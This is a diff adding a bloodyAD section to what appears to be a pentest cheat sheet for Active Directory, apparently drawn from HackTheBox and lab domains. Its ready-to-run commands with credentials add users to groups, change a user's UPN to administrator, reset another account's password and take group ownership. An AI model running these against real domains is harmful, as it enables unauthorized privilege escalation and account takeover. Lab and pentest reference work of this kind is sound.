@@ -130,6 +130,35 @@ ldapsearch -LLL -x -H ldap://192.168.68.64 -D "Administrator@contoso.org" -w 'wi
 ldapsearch -LLL -x -H ldap://192.168.68.64 -D "Administrator@contoso.org" -w 'win2016-cli-P@$swd' -b 'dc=contoso,dc=org' name memberOf
 ```
 
+## bloodyAD
+
+### add user to a group
+
+```bash
+bloodyAD --host 10.10.11.41 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader
+# [+] judith.mader added to Management
+```
+
+### change UPN
+
+```bash
+bloodyAD --host 192.168.1.12 --domain sales.contoso.lab -u lmodifr -p '94Dk5@!nDM' set object 'alice' userPrincipalName -v 'administrator@sales.contoso.lab'
+# [+] alice's userPrincipalName has been updated
+```
+
+### change user password
+
+```bash
+bloodyAD -k --host dc01.certified.htb -d certified.htb -u management_svc set password ca_operator somepassword12334
+# [+] Password changed successfully!
+```
+
+### set group owner
+
+```bash
+bloodyAD --host 10.10.11.41 -d certified.htb -u judith.mader -p judith09 set owner Management judith.mader
+```
+
 ## pywerview
 
 ```bash
